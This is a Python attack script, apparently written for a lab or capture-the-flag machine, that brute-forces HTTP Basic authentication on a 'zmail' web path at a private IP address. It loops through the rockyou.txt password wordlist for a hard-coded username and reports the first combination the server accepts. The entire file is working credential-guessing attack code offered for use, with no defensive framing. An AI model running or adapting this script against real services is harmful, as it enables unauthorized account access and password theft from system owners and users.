#!/usr/bin/python3

import requests
import sys
import signal
import time
import pdb
from base64 import b64decode
from base64 import b64encode
from pwn import *

# functions
def def_handler(signal, frame):
    print("[INFO] Quitting...")
    sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

main_url = "http://192.168.1.10/zmail"

def makeAthentication(combination_b64, p1):
    combination_b64 = combination_b64.decode()
    headers = {
        'Authorization': 'Basic %s' % combination_b64 
    }

    r = requests.get(main_url, headers=headers)
    if r.status_code != 401:
        p1.success("Credentials found: %s" % (b64decode(combination_b64)).decode())
        sys.exit(0)
        

def make_authorization():
    # create aa list with the following users
    users=["deez1", "p48", "all2"]
    f = open("/usr/share/wordlists/rockyou.txt", "rb") # rb = read in bytes format

    p1 = log.progress("Brute Force")
    p1.status("Starting brute force attack")
    time.sleep(2)
    counter = 1

    for password in f.readlines():
        password = (password.strip()).decode()
        combination = users[1]+":"+password
        p1.status("Testing comb [%d/14344392]: %s" % (counter, combination.split(":")[1]))
        
        combination_b64 = b64encode(combination.encode())
        # pdb.set_trace()
    
        makeAthentication(combination_b64, p1)
        counter += 1

if __name__ == "__main__":
    make_authorization()